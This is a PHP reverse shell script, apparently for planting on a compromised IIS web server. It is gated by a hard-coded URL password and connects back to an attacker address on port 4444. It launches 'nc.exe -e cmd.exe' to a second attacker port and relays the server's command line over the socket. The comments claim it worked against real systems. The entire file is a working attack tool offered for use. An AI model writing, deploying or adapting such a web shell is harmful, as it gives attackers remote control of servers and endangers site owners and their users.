<?php
# Used this for an IIS server with some restrictions on php functions
# Worked well in the real world
# You will need to have an open port on 4444 or whatever you change $port to

#password to trivially ward off any other peeps
if($_GET['pass'] != 'the-greatest-passw0rd-eva'){
	header('Location: http://root-of-the-vulnerable-website'); #require password to finish script
}

set_time_limit (0); #make sure full script exectues
$ip = '192.168.56.1'; #for connect back, this is your address
$port = '4444'; #your local open port
$chunk_size=1400;
$write_a = null;
$error_a = null;
$shell = 'cmd.exe /c Webdocs\\Example\\example.com\\wwwroot\\wp-admin\\user\\nc.exe -e cmd.exe 192.168.56.1 4445';
#program to execute after connection, connects to your port 4445 with the server's cmdline behind it
#basically you executed the cmdline on the server, which executed nc.exe with a cmdline behind it
#nc.exe connects to port 4445 on your computer. you need to have port 4444 and port 4445 open on your end

chdir("/"); #go to root of server
umask(0); #cause all files created to be world writeable

$sock = fsockopen($ip,$port,$errno,$errstr,30); #create socket object
$descriptorspec = array(
   0 => array("pipe", "r"), #stdin file descriptor
   1 => array("pipe", "w"), #stdout file descriptor
   2 => array("pipe", "w")  #stderr file descriptor
);
$process = proc_open($shell, $descriptorspec, $pipes); #run command, pipes are taken care of by php, dont have to worry about how these are handled
#proc_open starts a process on the server. here is an illistration for you:
#cmd.exe --> nc.exe -e cmd.exe (your ip) (your port) --> connects to your open port and you get a nice C:\ in your terminal window

stream_set_blocking($pipes[0], 0); #set non-blocking on pipes (so we can wait for them to be available)
stream_set_blocking($pipes[1], 0); #set non-blocking on pipes
stream_set_blocking($pipes[2], 0); #set non-blocking on pipes
stream_set_blocking($sock, 0); #set non-blocking on socket

for( $i = 0; $i < 1; $i++) { #run only once, so we dont cause infinite loop
	while($i < 1) {
		$read_a = array($sock, $pipes[1], $pipes[2]); #read_a will contain stdout and stderr
		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); #stream_select waits for arrays to change status, 1st is read array, 2nd is write array, 3rd is except array. (stdin, stdout, stderr respectively)

		if (in_array($sock, $read_a)) {
			$input = fread($sock, $chunk_size); #if this is from stdin (aka from me)
			fwrite($pipes[0], $input); #send to stdin (send to input of server) (write $input --> pipes[0])
		}
		if (in_array($pipes[1], $read_a)) {
			$input = fread($pipes[1], $chunk_size); #if from stdout (from server)
			fwrite($sock, $input); #send to stdout (to me) (write $input --> $sock)
		}
		if (in_array($pipes[2], $read_a)) {
			$input = fread($pipes[2], $chunk_size); #if from stderr (from server)
			fwrite($sock, $input); #send to stdout (to me) (write $input --> $sock)
		}
		$i = $i +1; # make i = 1 to end loop
	}
}

fclose($sock); #clean up
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

?>
